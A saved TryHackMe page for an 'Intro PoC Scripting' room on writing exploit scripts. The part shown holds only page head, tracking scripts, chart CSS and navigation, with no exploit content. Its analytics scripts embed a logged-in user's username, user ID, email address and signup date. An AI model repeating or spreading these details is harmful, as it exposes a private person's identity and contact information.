<!DOCTYPE html>
<!-- saved from url=(0044)https://tryhackme.com/room/intropocscripting -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Intro PoC Scripting</title>
<meta name="description" content="Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from many different sources.">
<meta name="og:description" content="Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from many different sources.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Intro PoC Scripting">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/6142091b256a7e8d7b6e1fc9349bd425.png">
<meta property="og:url" content="https://tryhackme.com/room/intropocscripting">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn the importance and beginner skills of crafting custom proof of concept (PoC) exploit scripts from many different sources.">

<script type="text/javascript" async="" src="./TryHackMe _ Intro PoC Scripting_files/pgpbhph6"></script><script src="./TryHackMe _ Intro PoC Scripting_files/jquery.min.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Intro PoC Scripting_files/boostrap431.min.css">
<script src="./TryHackMe _ Intro PoC Scripting_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Intro PoC Scripting_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Intro PoC Scripting_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Intro PoC Scripting_files/general-style.css">
<script src="./TryHackMe _ Intro PoC Scripting_files/script.js"></script>
<script src="./TryHackMe _ Intro PoC Scripting_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Intro PoC Scripting_files/cookieconsent.min.css">
<script src="./TryHackMe _ Intro PoC Scripting_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Intro PoC Scripting_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Intro PoC Scripting_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Intro PoC Scripting_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><script async="" src="./TryHackMe _ Intro PoC Scripting_files/modules.85ce248fb47f3a28349a.js" charset="utf-8"></script><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style></head>


<body><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Intro PoC Scripting_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro PoC Scripting_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro PoC Scripting_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro PoC Scripting_files/public-rooms.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Intro PoC Scripting_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Intro PoC Scripting_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Intro PoC Scripting_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Intro PoC Scripting_files/lottie-player.js"></script>

<div id="room-content">
<div id="room-content-main">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Intro PoC Scripting_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/intropocscripting#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/intropocscripting#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;span&gt;Your streak was saved by your 1 day streak freeze! 
        Answer today to stop it resetting tomorrow.&lt;/span&gt;" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green" style="color: rgb(226, 141, 52);">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sun Jul 16 2023 18:47:44 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 1
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/intropocscripting#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item dropdown">
<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/intropocscripting#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
<img src="./TryHackMe _ Intro PoC Scripting_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Intro PoC Scripting_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
<div class="modal-body">
<figure>
